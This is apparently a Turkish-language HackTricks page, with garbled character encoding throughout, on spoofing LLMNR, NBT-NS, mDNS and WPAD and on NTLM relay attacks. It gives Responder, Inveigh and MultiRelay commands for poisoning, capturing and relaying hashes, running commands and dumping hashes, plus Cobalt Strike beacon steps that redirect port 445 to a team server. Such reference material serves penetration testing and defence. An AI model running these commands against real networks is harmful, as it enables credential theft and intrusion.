# Sahte LLMNR, NBT-NS, mDNS/DNS ve WPAD ve Aktarma SaldÄ±rÄ±larÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## AÄŸ Protokolleri

### Yerel Ana Bilgisayar Ã‡Ã¶zÃ¼mleme Protokolleri
- **LLMNR, NBT-NS ve mDNS**:
- Microsoft ve diÄŸer iÅŸletim sistemleri DNS baÅŸarÄ±sÄ±z olduÄŸunda yerel ad Ã§Ã¶zÃ¼mlemesi iÃ§in LLMNR ve NBT-NS kullanÄ±r. Benzer ÅŸekilde, Apple ve Linux sistemleri mDNS kullanÄ±r.
- Bu protokoller, kimlik doÄŸrulamasÄ±z, UDP Ã¼zerinden yayÄ±n yapmalarÄ± nedeniyle dinleme ve sahtecilikten etkilenir.
- Bu protokollerin sorgulayan ana bilgisayarlara sahte yanÄ±tlar gÃ¶ndererek hizmetleri taklit etmek iÃ§in [Responder](https://github.com/lgandx/Responder) kullanÄ±labilir.
- Responder kullanarak hizmet taklit etme hakkÄ±nda daha fazla bilgiye [buradan](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ulaÅŸÄ±labilir.

### Web Proxy Otomatik KeÅŸif ProtokolÃ¼ (WPAD)
- WPAD tarayÄ±cÄ±larÄ±n proxy ayarlarÄ±nÄ± otomatik olarak keÅŸfetmelerine olanak tanÄ±r.
- KeÅŸif, DHCP, DNS veya DNS baÅŸarÄ±sÄ±z olursa LLMNR ve NBT-NS'ye geri dÃ¶nerek kolaylaÅŸtÄ±rÄ±lÄ±r.
- Responder, istemcileri kÃ¶tÃ¼ niyetli WPAD sunucularÄ±na yÃ¶nlendiren WPAD saldÄ±rÄ±larÄ±nÄ± otomatikleÅŸtirebilir.

### Protokol Zehirleme Ä°Ã§in Responder
- **Responder**, LLMNR, NBT-NS ve mDNS sorgularÄ±nÄ± zehirlemek iÃ§in kullanÄ±lan bir araÃ§tÄ±r, sorgu tÃ¼rlerine gÃ¶re seÃ§ici olarak yanÄ±t verir ve genellikle SMB hizmetlerini hedef alÄ±r.
- Kali Linux'ta Ã¶nceden yÃ¼klenmiÅŸ olarak gelir ve `/etc/responder/Responder.conf` konumunda yapÄ±landÄ±rÄ±labilir.
- Responder, yakalanan hash'leri ekranda gÃ¶sterir ve bunlarÄ± `/usr/share/responder/logs` dizininde kaydeder.
- IPv4 ve IPv6'yÄ± destekler.
- Responder'Ä±n Windows sÃ¼rÃ¼mÃ¼ [burada](https://github.com/lgandx/Responder-Windows) bulunabilir.

#### Responder'Ä± Ã‡alÄ±ÅŸtÄ±rma
- VarsayÄ±lan ayarlarla Responder'Ä± Ã§alÄ±ÅŸtÄ±rmak iÃ§in: `responder -I <ArayÃ¼z>`
- Daha agresif sorgulama iÃ§in (potansiyel yan etkilerle): `responder -I <ArayÃ¼z> -P -r -v`
- NTLMv1 meydan okumalarÄ±nÄ±/yanÄ±tlarÄ±nÄ± daha kolay kÄ±rabilmek iÃ§in teknikler: `responder -I <ArayÃ¼z> --lm --disable-ess`
- WPAD taklit edilmesi ÅŸu ÅŸekilde etkinleÅŸtirilebilir: `responder -I <ArayÃ¼z> --wpad`
- NetBIOS istekleri saldÄ±rganÄ±n IP'sine Ã§Ã¶zÃ¼mlenebilir ve kimlik doÄŸrulama vekili kurulabilir: `responder.py -I <arayÃ¼z> -Pv`

### Responder ile DHCP Zehirleme
- DHCP yanÄ±tlarÄ±nÄ± sahteleÅŸtirerek bir kurbanÄ±n yÃ¶nlendirme bilgilerini kalÄ±cÄ± olarak zehirleyebilir, ARP zehirleme iÃ§in daha gizli bir alternatif sunar.
- Hedef aÄŸÄ±n yapÄ±landÄ±rmasÄ± hakkÄ±nda kesin bilgi gerektirir.
- SaldÄ±rÄ±yÄ± Ã§alÄ±ÅŸtÄ±rmak: `./Responder.py -I eth0 -Pdv`
- Bu yÃ¶ntem etkili bir ÅŸekilde NTLMv1/2 hash'lerini yakalayabilir, ancak aÄŸ kesintisinden kaÃ§Ä±nmak iÃ§in dikkatli bir ÅŸekilde ele alÄ±nmalÄ±dÄ±r.

### Responder ile Kimlik Bilgilerinin YakalanmasÄ±
- Responder yukarÄ±da bahsedilen protokoller kullanÄ±larak hizmetleri taklit eder, kullanÄ±cÄ±lar sahtecilik yapÄ±lan hizmetlere kimlik doÄŸrulamaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda kimlik bilgilerini (genellikle NTLMv2 Meydan Okuma/YanÄ±tÄ±) yakalar.
- Kimlik bilgilerini daha kolay kÄ±rmak iÃ§in NetNTLMv1'e dÃ¼ÅŸÃ¼rme veya ESS'yi devre dÄ±ÅŸÄ± bÄ±rakma giriÅŸimleri yapÄ±labilir.

Bu tekniklerin yasal ve etik bir ÅŸekilde kullanÄ±lmasÄ±, uygun yetkilendirme saÄŸlanmasÄ± ve aÄŸda kesinti veya izinsiz eriÅŸimden kaÃ§Ä±nÄ±lmasÄ± Ã¶nemlidir.

## Inveigh

Inveigh, Windows sistemler iÃ§in tasarlanmÄ±ÅŸ bir araÃ§tÄ±r ve penetrasyon testÃ§ileri ve kÄ±rmÄ±zÄ± takÄ±m Ã¼yeleri iÃ§in benzer iÅŸlevlere sahiptir. Sahtecilik ve adam ortasÄ±nda saldÄ±rÄ±lar gerÃ§ekleÅŸtiren Responder'a benzer iÅŸlevsellikler sunar. AraÃ§, bir PowerShell betiÄŸinden C# ikiliye evrim geÃ§irmiÅŸ olup [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ve [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ana sÃ¼rÃ¼mleri olarak geliÅŸtirilmiÅŸtir. DetaylÄ± parametreler ve talimatlar [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) sayfasÄ±nda bulunabilir.

Inveigh, PowerShell Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±labilir:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ya da bir C# ikili dosyasÄ± olarak yÃ¼rÃ¼tÃ¼lÃ¼r:
```bash
Inveigh.exe
```
### NTLM AktarÄ±m SaldÄ±rÄ±sÄ±

Bu saldÄ±rÄ±, bir hedef makineye eriÅŸmek iÃ§in SMB kimlik doÄŸrulama oturumlarÄ±nÄ± kullanÄ±r ve baÅŸarÄ±lÄ± olursa bir sistem kabuÄŸu saÄŸlar. Ana gereksinimler ÅŸunlardÄ±r:
- Kimlik doÄŸrulayan kullanÄ±cÄ±nÄ±n, iletilen ana bilgisayarda Yerel YÃ¶netici eriÅŸimine sahip olmasÄ± gerekir.
- SMB imzalamasÄ±nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± gerekmektedir.

#### 445 Port YÃ¶nlendirme ve TÃ¼nelleme

DoÄŸrudan aÄŸ tanÄ±tÄ±mÄ±nÄ±n mÃ¼mkÃ¼n olmadÄ±ÄŸÄ± senaryolarda, 445 numaralÄ± port Ã¼zerindeki trafiÄŸin yÃ¶nlendirilmesi ve tÃ¼nellenmesi gerekmektedir. [**PortBender**](https://github.com/praetorian-inc/PortBender) gibi araÃ§lar, 445 numaralÄ± port trafiÄŸini baÅŸka bir porta yÃ¶nlendirmede yardÄ±mcÄ± olur; bu, yerel yÃ¶netici eriÅŸimi sÃ¼rÃ¼cÃ¼ yÃ¼kleme iÃ§in kullanÄ±labilir olduÄŸunda Ã¶nemlidir.

Cobalt Strike'da PortBender kurulumu ve iÅŸleyiÅŸi:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM AktarÄ±m SaldÄ±rÄ±sÄ± iÃ§in DiÄŸer AraÃ§lar

- **Metasploit**: Proxy'ler, yerel ve uzak ana bilgisayar ayrÄ±ntÄ±larÄ± ile kurulur.
- **smbrelayx**: SMB oturumlarÄ±nÄ± aktarmak ve komutlarÄ± yÃ¼rÃ¼tmek veya arka kapÄ±lar daÄŸÄ±tmak iÃ§in Python betiÄŸi.
- **MultiRelay**: Belirli kullanÄ±cÄ±larÄ± veya tÃ¼m kullanÄ±cÄ±larÄ± aktarmak, komutlarÄ± yÃ¼rÃ¼tmek veya hash'leri dÃ¶kmek iÃ§in Responder paketinden bir araÃ§.

Her bir araÃ§, gerektiÄŸinde SOCKS proxy Ã¼zerinden Ã§alÄ±ÅŸacak ÅŸekilde yapÄ±landÄ±rÄ±labilir, dolaylÄ± aÄŸ eriÅŸimi ile bile saldÄ±rÄ±larÄ± mÃ¼mkÃ¼n kÄ±lar.

### MultiRelay Ä°ÅŸlemi

MultiRelay, belirli IP'ler veya kullanÄ±cÄ±larÄ± hedefleyerek _**/usr/share/responder/tools**_ dizininden yÃ¼rÃ¼tÃ¼lÃ¼r.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### NTLM AktarÄ±m SaldÄ±rÄ±larÄ±nÄ± Yapmak Ä°Ã§in KapsamlÄ± Bir Set

Windows'ta **bazÄ± ayrÄ±calÄ±klÄ± hesaplarÄ± zorlayarak** bu hesaplarÄ±n keyfi makinelerde kimlik doÄŸrulamasÄ±nÄ± yapmasÄ±nÄ± saÄŸlayabilirsiniz. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referanslar
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
AWS Hacking'Ä± Ã–ÄŸrenin ve UygulayÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'Ä± Ã–ÄŸrenin ve UygulayÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
